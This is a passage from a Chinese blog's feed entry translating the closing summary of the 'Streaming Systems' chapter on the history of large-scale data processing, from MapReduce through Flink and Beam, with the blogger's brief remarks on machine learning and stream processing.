通过实现跨执行引擎的可移植性承诺，我们希望将 Beam 建立为表达程序化数据处理流水线的通用语言，类似于当今 SQL 作为声明性数据处理的通用处理方式。这是一个雄心勃勃的目标，我们并没有完全实现这个计划，到目前为止我们还有很长的路要走。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们对数据处理技术的十五年发展进行了蜻蜓点水般的回顾，重点关注那些推动流式计算发展的关键系统和关键思想。来，最后，我们再做一次总结：</p><ul><li><strong>MapReduce：可扩展性和简单性</strong> 通过在强大且可扩展的执行引擎之上提供一组简单的数据处理抽象，MapReduce 让我们的数据工程师专注于他们的数据处理需求的业务逻辑，而不是去构建能够适应在一大堆普通商用服务器上的大规模分布式处理程序。</li><li><strong>Hadoop：开源生态系统</strong> 通过构建一个关于 MapReduce 的开源平台，无意中创建了一个蓬勃发展的生态系统，其影响力所及的范围远远超出了其最初 Hadoop 的范围，每年有大量的创新性想法在 Hadoop 社区蓬勃发展。</li><li><strong>Flume：管道及优化</strong> 通过将逻辑流水线操作的高级概念与智能优化器相结合，Flume 可以编写简洁且可维护的 Pipeline，其功能突破了 MapReduce 的 Map→Shuffle→Reduce 的限制，而不会牺牲性能。</li><li><strong>Storm：弱一致性，低延迟</strong> 通过牺牲结果的正确性以减少延迟，Storm 为大众带来了流计算，并开创了 Lambda 架构的时代，其中弱一致的流处理引擎与强大一致的批处理系统一起运行，以实现真正的业务目标低延迟，最终一致型的结果。</li><li><strong>Spark: 强一致性</strong> 通过利用强大一致的批处理引擎的重复运行来提供无界数据集的连续处理，Spark Streaming 证明至少对于有序数据集的情况，可以同时具有正确性和低延迟结果。</li><li><strong>MillWheel：乱序处理</strong> 通过将强一致性、精确一次处理与用于推测时间的工具（如水印和定时器）相结合，MillWheel 做到了无序数据进行准确的流式处理。</li><li><strong>Kafka: 持久化的流式存储，流和表对偶性</strong> 通过将持久化数据日志的概念应用于流传输问题，Kafka 支持了流式数据可重放功能。通过对流和表理论的概念进行推广，阐明数据处理的概念基础。</li><li><strong>Cloud Dataflow：统一批流处理引擎</strong> 通过将 MillWheel 的无序流式处理与高阶抽象、自动优化的 Flume 相结合，Cloud Dataflow 为批流数据处理提供了统一模型，并且灵活地平衡正确性、计算延迟、成本的关系。</li><li><strong>Flink：开源流处理创新者</strong> 通过快速将无序流式数据处理的强大功能带到开源世界，并将其与分布式快照及保存点功能等自身创新相结合，Flink 提高了开源流处理的业界标准并引领了当前流式处理创新趋势。</li><li><strong>Beam: 可移植性</strong> 通过提供整合行业最佳创意的强大抽象层，Beam 提供了一个可移植 API 抽象，其定位为与 SQL 提供的声明性通用语言等效的程序接口，同时也鼓励在整个行业中推进创新。</li></ul><p>可以肯定的说，我在这里强调的这 10 个项目及其成就的说明并没有超出当前大数据的历史发展。但是，它们对我来说是一系列重要且值得注意的大数据发展里程碑，它共同描绘了过去十五年中流处理演变的时间轴。自最早的 MapReduce 系统开始，尽管沿途有许多起伏波折，但不知不觉我们已经走出来很长一段征程。即便如此，在流式系统领域，未来我们仍然面临着一系列的问题亟待解决。正所谓：路漫漫其修远兮，吾将上下而求索。</p></li></ol></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;文章原作者是Google MapReduce小组的一员，翻译自《Streaming System》最后一章《The Evolution of Large-Scale Data Processing》，翻译者是 陈守元（花名：巴真），阿里巴巴高级产品专家。阿里巴巴实时计算团队产品负责人。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我最近看了一些深度学习的文章，有一些感触，机器学习的使用范围确实很有限，大众以为现在的AI和现在实际上的AI其实根本不是一个东西，如果机器学习能在短时间内迅速发展起来，我个人觉得只有两种可能：第一种可能：要么横向在某个传统行业取得巨大进展，被其他行业纷纷效仿，但是很难，机器学习需要都整体数据有一个完全的把控，只有已经自动化相当完备的行业才有使用机器学习的基础，更何况还有行业壁垒，从中盈利的公司可能根本不会宣传，别的人也就无从得知了。&lt;/p&gt;
&lt;p&gt;第二种可能：深度学习出现重大进展，深度学习作为黑盒使用是一件很离谱的事情，理论上来说要解析深度学习的原理需要很多别的学科来进行理论支持，短时间内出现重大进展其实可能也不大。&lt;/p&gt;
&lt;p&gt;那么如果AI这阵风最终没有刮起来，那么还是要看流处理的了。&lt;/p&gt;
&lt;p&gt;下面是原文：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="技术发展史" scheme="http://yoursite.com/categories/Reading-notes/%E6%8A%80%E6%9C%AF%E5%8F%91%E5%B1%95%E5%8F%B2/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="大数据" scheme="http://yoursite.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
      <category term="流式计算" scheme="http://yoursite.com/tags/%E6%B5%81%E5%BC%8F%E8%AE%A1%E7%AE%97/"/>
    
      <category term="大数据浪潮史" scheme="http://yoursite.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%B5%AA%E6%BD%AE%E5%8F%B2/"/>
    
  </entry>
  
</feed>
